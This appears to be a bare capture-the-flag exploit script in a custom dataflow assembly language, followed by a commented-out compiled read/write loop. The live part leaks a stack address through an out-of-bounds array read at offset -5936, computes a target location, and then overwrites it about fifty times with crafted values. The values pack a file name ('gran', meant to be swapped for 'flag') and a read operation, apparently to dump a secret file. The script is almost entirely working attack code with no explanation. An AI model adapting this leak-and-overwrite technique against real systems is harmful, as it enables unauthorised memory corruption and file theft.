array = NAR 100
# offset is -5936 to the value of the stack leak
ref, stack_leak = ARF array -5936
OUTD stack_leak

fixed_stack_leak = AND stack_leak -256

ring_location = ADD fixed_stack_leak -107

# can replace gran with flag
fd = AST ring_location 0x6e617267001d00


# now let's directly call a RED
read_payload = ADD fd 0

read_payload_1 = SHL read_payload 16

READ_FLAG = DUP 6
read_payload_2 = XOR read_payload_1 READ_FLAG

read_payload_final = SHL read_payload_2 8

first = AST ring_location read_payload_final
OUTS first

first_rest = XOR first first
2_payload = ADD read_payload_final first_rest

2_out = AST ring_location 2_payload
OUTS 2_out

3_out = AST ring_location 2_payload
OUTS 3_out

4_out = AST ring_location 2_payload
OUTS 4_out

5_out = AST ring_location 2_payload
OUTS 5_out

6_out = AST ring_location 2_payload
OUTS 6_out

7_out = AST ring_location 2_payload
OUTS 7_out

8_out = AST ring_location 2_payload
OUTS 8_out

9_out = AST ring_location 2_payload
OUTS 9_out

10_out = AST ring_location 2_payload
OUTS 10_out

11_out = AST ring_location 2_payload
OUTS 11_out

12_out = AST ring_location 2_payload
OUTS 12_out

13_out = AST ring_location 2_payload
OUTS 13_out

14_out = AST ring_location 2_payload
OUTS 14_out

15_out = AST ring_location 2_payload
OUTS 15_out

16_out = AST ring_location 2_payload
OUTS 16_out

17_out = AST ring_location 2_payload
OUTS 17_out

18_out = AST ring_location 2_payload
OUTS 18_out

19_out = AST ring_location 2_payload
OUTS 19_out

20_out = AST ring_location 2_payload
OUTS 20_out

21_out = AST ring_location 2_payload
OUTS 21_out

22_out = AST ring_location 2_payload
OUTS 22_out

23_out = AST ring_location 2_payload
OUTS 23_out

24_out = AST ring_location 2_payload
OUTS 24_out

25_out = AST ring_location 2_payload
OUTS 25_out

26_out = AST ring_location 2_payload
OUTS 26_out

27_out = AST ring_location 2_payload
OUTS 27_out

28_out = AST ring_location 2_payload
OUTS 28_out

29_out = AST ring_location 2_payload
OUTS 29_out

30_out = AST ring_location 2_payload
OUTS 30_out

31_out = AST ring_location 2_payload
OUTS 31_out

32_out = AST ring_location 2_payload
OUTS 32_out

33_out = AST ring_location 2_payload
OUTS 33_out

34_out = AST ring_location 2_payload
OUTS 34_out

35_out = AST ring_location 2_payload
OUTS 35_out

36_out = AST ring_location 2_payload
OUTS 36_out

37_out = AST ring_location 2_payload
OUTS 37_out

38_out = AST ring_location 2_payload
OUTS 38_out

39_out = AST ring_location 2_payload
OUTS 39_out

40_out = AST ring_location 2_payload
OUTS 40_out

41_out = AST ring_location 2_payload
OUTS 41_out

42_out = AST ring_location 2_payload
OUTS 42_out

43_out = AST ring_location 2_payload
OUTS 43_out

44_out = AST ring_location 2_payload
OUTS 44_out

45_out = AST ring_location 2_payload
OUTS 45_out

46_out = AST ring_location 2_payload
OUTS 46_out

47_out = AST ring_location 2_payload
OUTS 47_out

48_out = AST ring_location 2_payload
OUTS 48_out

49_out = AST ring_location 2_payload
OUTS 49_out

50_out = AST ring_location 2_payload
OUTS 50_out




# _main_arg_0_export:
# _tmp_31_internal__main_arg_0 = DUP _main_arg_0
# _tmp_30_function_tag = ETG _tmp_31_internal__main_arg_0
# fd_tmp_42 = DUP fd
# _tmp_43 = CTG _tmp_30_function_tag 0
# done_tmp_44 = DUP _tmp_43
# _tmp_47_new_tag_with_old, _tmp_48_old_tag_with_old = NTG fd_tmp_42
# _tmp_49_old_tag_with_new = CTG _tmp_47_new_tag_with_old _tmp_48_old_tag_with_old
# _fd_loop_input_tagged_tmp_50 = CTG _tmp_47_new_tag_with_old fd_tmp_42
# _fd_loop_start_tmp_53 = MER _fd_loop_input_tagged_tmp_50 _fd_loop_last_value_tmp_51
# _byte_loop_input_tagged_tmp_55 = CTG _tmp_47_new_tag_with_old _byte_not_defined_before_loop_tmp_45
# _byte_loop_start_tmp_58 = MER _byte_loop_input_tagged_tmp_55 _byte_loop_last_value_tmp_56
# _write_output_loop_input_tagged_tmp_60 = CTG _tmp_47_new_tag_with_old _write_output_not_defined_before_loop_tmp_46
# _write_output_loop_start_tmp_63 = MER _write_output_loop_input_tagged_tmp_60 _write_output_loop_last_value_tmp_61
# _done_loop_input_tagged_tmp_65 = CTG _tmp_47_new_tag_with_old done_tmp_44
# _done_loop_start_tmp_68 = MER _done_loop_input_tagged_tmp_65 _done_loop_last_value_tmp_66
# _loop_current_tag_tmp_70 = ETG _fd_loop_start_tmp_53
# _tmp_71 = CTG _loop_current_tag_tmp_70 0
# _tmp_72 = EQ _done_loop_start_tmp_68 _tmp_71
# _loop_next_tag_tmp_73 = ETG _fd_loop_again_tmp_52
# _fd_true_tmp_74, _fd_false_tmp_75 = BRR _fd_loop_start_tmp_53 _tmp_72
# _fd_loop_again_tmp_52 = ITG _fd_true_tmp_74
# _fd_reset_il_tmp_76 = SIL _fd_false_tmp_75 0
# _fd_loop_end_tmp_54 = CTG _tmp_49_old_tag_with_new _fd_reset_il_tmp_76
# _byte_true_tmp_77, _byte_false_tmp_78 = BRR _byte_loop_start_tmp_58 _tmp_72
# _byte_loop_again_tmp_57 = ITG _byte_true_tmp_77
# _byte_reset_il_tmp_79 = SIL _byte_false_tmp_78 0
# _byte_loop_end_tmp_59 = CTG _tmp_49_old_tag_with_new _byte_reset_il_tmp_79
# _write_output_true_tmp_80, _write_output_false_tmp_81 = BRR _write_output_loop_start_tmp_63 _tmp_72
# _write_output_loop_again_tmp_62 = ITG _write_output_true_tmp_80
# _write_output_reset_il_tmp_82 = SIL _write_output_false_tmp_81 0
# _write_output_loop_end_tmp_64 = CTG _tmp_49_old_tag_with_new _write_output_reset_il_tmp_82
# _done_true_tmp_83, _done_false_tmp_84 = BRR _done_loop_start_tmp_68 _tmp_72
# _done_loop_again_tmp_67 = ITG _done_true_tmp_83
# _done_reset_il_tmp_85 = SIL _done_false_tmp_84 0
# _done_loop_end_tmp_69 = CTG _tmp_49_old_tag_with_new _done_reset_il_tmp_85
# _tmp_86 = CTG _loop_next_tag_tmp_73 1
# # Function call to read_bytes
# _tmp_87_new_tag_with_old, _tmp_88_old_tag_with_old = NTG _fd_loop_again_tmp_52
# _tmp_89_new_tag_with_new = CTG _tmp_87_new_tag_with_old _tmp_87_new_tag_with_old
# _tmp_90_old_tag_with_new = CTG _tmp_87_new_tag_with_old _tmp_88_old_tag_with_old
# _read_bytes_arg_0_export = CTG _tmp_87_new_tag_with_old _fd_loop_again_tmp_52
# _read_bytes_arg_1_export = CTG _tmp_87_new_tag_with_old _tmp_86
# _read_bytes_return_location_export = CTG _tmp_89_new_tag_with_new _tmp_91_read_bytes_return_label
# _tmp_91_read_bytes_return_label:
# _tmp_92_return_value_tagged = DUP _
# _tmp_93_return_value = CTG _tmp_90_old_tag_with_new _tmp_92_return_value_tagged
# byte_tmp_94 = DUP _tmp_93_return_value
# _tmp_95 = CTG _loop_next_tag_tmp_73 -1
# _tmp_96 = EQ byte_tmp_94 _tmp_95
# _byte_tmp_97_true, _byte_tmp_98_false = BRR byte_tmp_94 _tmp_96
# _write_output_tmp_99_true, _write_output_tmp_100_false = BRR _write_output_loop_again_tmp_62 _tmp_96
# _done_tmp_101_true, _done_tmp_102_false = BRR _done_loop_again_tmp_67 _tmp_96
# _tmp_103_1 = CTG _loop_next_tag_tmp_73 1
# _tmp_104_true, _tmp_105_false = BRR _tmp_103_1 _tmp_96
# _tmp_107 = CTG _loop_next_tag_tmp_73 1
# _tmp_106, _ = BRR _tmp_107 _tmp_104_true
# done_tmp_108 = DUP _tmp_106
# _tmp_110 = CTG _loop_next_tag_tmp_73 1
# _tmp_109, _ = BRR _tmp_110 _tmp_105_false
# _tmp_112 = CTG _loop_next_tag_tmp_73 1
# _tmp_111, _ = BRR _tmp_112 _tmp_105_false
# # Function call to write_bytes
# _tmp_113_new_tag_with_old, _tmp_114_old_tag_with_old = NTG _tmp_109
# _tmp_115_new_tag_with_new = CTG _tmp_113_new_tag_with_old _tmp_113_new_tag_with_old
# _tmp_116_old_tag_with_new = CTG _tmp_113_new_tag_with_old _tmp_114_old_tag_with_old
# _write_bytes_arg_0_export = CTG _tmp_113_new_tag_with_old _tmp_109
# _write_bytes_arg_1_export = CTG _tmp_113_new_tag_with_old _byte_tmp_98_false
# _write_bytes_arg_2_export = CTG _tmp_113_new_tag_with_old _tmp_111
# _write_bytes_return_location_export = CTG _tmp_115_new_tag_with_new _tmp_117_write_bytes_return_label
# _tmp_117_write_bytes_return_label:
# _tmp_118_return_value_tagged = DUP _
# _tmp_119_return_value = CTG _tmp_116_old_tag_with_new _tmp_118_return_value_tagged
# write_output_tmp_120 = DUP _tmp_119_return_value
# _write_output_phi_tmp_121 = MER _write_output_tmp_99_true write_output_tmp_120
# _done_phi_tmp_122 = MER done_tmp_108 _done_tmp_102_false
# _byte_phi_tmp_123 = MER _byte_tmp_97_true _byte_tmp_98_false
# _fd_loop_last_value_tmp_51 = DUP _fd_loop_again_tmp_52
# _byte_loop_last_value_tmp_56 = DUP _byte_phi_tmp_123
# _write_output_loop_last_value_tmp_61 = DUP _write_output_phi_tmp_121
# _done_loop_last_value_tmp_66 = DUP _done_phi_tmp_122
# _main_return_location_export:
# _tmp_124 = DUP _main_return_location
# _ = RTD _write_output_loop_end_tmp_64 _tmp_124
# export _main_arg_0_export
# export _main_return_location_export
